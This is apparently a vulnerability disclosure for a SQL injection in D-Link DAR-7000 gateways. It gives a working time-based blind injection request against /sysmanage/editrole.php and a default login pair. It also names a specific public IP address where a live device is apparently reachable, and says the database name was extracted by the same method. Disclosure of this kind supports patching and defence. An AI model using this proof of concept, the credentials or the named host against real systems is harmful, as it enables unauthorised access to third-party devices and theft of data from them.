There is a backend SQL injection vulnerability in the D-LINK DAR-7000 series online behavior audit gateway. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-7000-40( DAR V31R02B1413C)
<img width="1321" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/3dceabf9-d360-43db-9c27-e0e3921bb48c">


Vulnerability Path  ：/sysmanage/editrole.php

Vulnerability type： SQL injection


Vulnerability hazards：Attackers can exploit vulnerabilities to obtain sensitive database information

See the login page.

https://60.22.74.195:8443/

<img width="718" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/11fd46a4-ad7f-424d-a539-d628fc65af71">



There is a default account password present： test/admin@123



<img width="725" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/14f77281-6e6f-4058-9091-72e27a648569">



​                               

 Construct the following POC to determine the presence of SQL injection for the id parameter  

POC:
POST /sysmanage/editrole.php HTTP/1.1
Host: 
Cookie: PHPSESSID=bbecd470b51ebcf03793acadba87a61f
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

hid_id=(select*from(select(sleep(3)))a)![image](https://github.com/flyyue2001/cve/assets/88701694/7a4ee400-b2fb-40bf-9b50-5de605e8f0ff)


<img width="731" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/988549dd-1e61-4677-9c58-5aaafe27d0cf">


 By analogy, obtain the database name nsg    

<img width="725" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/4149a219-fa7a-45d2-9154-a3b2e336f084">

 
